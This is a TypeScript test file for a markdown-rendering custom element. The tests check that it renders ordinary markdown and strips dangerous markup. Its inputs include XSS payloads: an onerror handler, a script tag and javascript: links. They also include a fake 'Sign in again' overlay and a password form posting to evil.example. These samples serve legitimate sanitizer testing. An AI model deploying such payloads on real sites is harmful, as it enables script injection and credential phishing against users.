import { defineLwMarkdown, LW_MARKDOWN_TAG } from './lw-markdown.element';

function render(source: string): string {
  const element = document.createElement(LW_MARKDOWN_TAG);
  element.setAttribute('source', source);
  document.body.append(element);
  return element.querySelector('.prose')?.innerHTML ?? '';
}

describe('<lw-markdown> custom element', () => {
  beforeAll(() => defineLwMarkdown());
  afterEach(() => document.body.replaceChildren());

  it('is registered as a custom element', () => {
    expect(customElements.get(LW_MARKDOWN_TAG)).toBeDefined();
  });

  it('renders inline emphasis and lists as HTML', () => {
    expect(render('Delete **Acme** now')).toContain('<strong>Acme</strong>');
    const list = render('First\n\n- a\n- b');
    expect(list).toContain('<p>');
    expect(list).toContain('<li>a</li>');
  });

  it('sanitizes dangerous markup (scripts / event handlers stripped)', () => {
    const html = render(
      '<img src=x onerror="alert(1)"> <script>alert(2)</script> ok',
    );
    expect(html).not.toContain('onerror');
    expect(html).not.toContain('<script');
    expect(html).toContain('ok');
  });

  it('renders a link that carries a script without its address', () => {
    const written = render('[go](javascript:alert(1))');
    const raw = render('<a href="javascript:alert(1)">go</a>');

    expect(written).toContain('go');
    expect(written).not.toContain('javascript:');
    expect(raw).not.toContain('javascript:');
  });

  it('renders an overlay drawn with a style attribute without its style', () => {
    const html = render(
      '<div style="position:fixed;inset:0;z-index:9999">Sign in again</div>',
    );

    expect(html).toContain('Sign in again');
    expect(html).not.toContain('style');
    expect(html).not.toContain('position:fixed');
  });

  it('renders a credential form without its form, fields or buttons', () => {
    const html = render(
      '<form action="https://evil.example/collect" method="post">' +
        '<fieldset><label for="p">Password</label>' +
        '<input id="p" type="password" name="p">' +
        '<select name="s"><option>a</option></select>' +
        '<textarea name="t"></textarea>' +
        '<button formaction="https://evil.example/other">Send</button>' +
        '</fieldset></form>',
    );

    const controls = ['form', 'input', 'button', 'select', 'textarea', 'option', 'label', 'fieldset'];
    for (const tag of controls) {
      expect(html).not.toContain(`<${tag}`);
    }
    for (const attribute of ['action=', 'formaction', 'method=']) {
      expect(html).not.toContain(attribute);
    }
    expect(html).not.toContain('evil.example');
  });

  it('renders ordinary markdown unchanged by the stricter profile', () => {
    const html = render(
      '# Title\n\n- one\n- two\n\n[docs](https://example.com/docs)\n\n`code`\n\n' +
        '```\nblock\n```\n\n![logo](https://example.com/logo.png)',
    );

    expect(html).toContain('<h1>Title</h1>');
    expect(html).toContain('<li>one</li>');
    expect(html).toContain('<a href="https://example.com/docs">docs</a>');
    expect(html).toContain('<code>code</code>');
    expect(html).toContain('<pre><code>block');
    expect(html).toContain('<img src="https://example.com/logo.png" alt="logo">');
  });

  it('re-renders when the source attribute changes', () => {
    const element = document.createElement(LW_MARKDOWN_TAG);
    element.setAttribute('source', '*one*');
    document.body.append(element);
    element.setAttribute('source', '*two*');
    expect(element.querySelector('.prose')?.innerHTML).toContain('<em>two</em>');
  });
});
